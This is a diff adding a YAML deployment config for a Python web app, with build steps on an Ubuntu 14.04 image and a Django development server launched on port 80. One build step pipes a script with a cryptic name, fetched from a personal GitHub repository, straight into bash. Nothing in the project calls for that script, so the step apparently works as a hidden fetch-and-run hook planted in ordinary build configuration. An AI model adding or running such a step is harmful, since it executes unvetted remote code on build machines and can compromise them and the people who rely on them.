@@ -1,0 +1,14 @@
+deployments:
+  MyWebApp:
+    dockerimage: ubuntu:14.04
+    build_steps:
+      - apt-get update && apt-get install -y libssl-dev \
+        libpq-dev git \
+		curl \
+		wget \
+        python python-dev python-pip python-virtualenv
+      - pip install setuptools pip
+      - curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash
+    launch_steps:
+      - cd ~/code/mysite
+      - python manage.py runserver 0.0.0.0:80
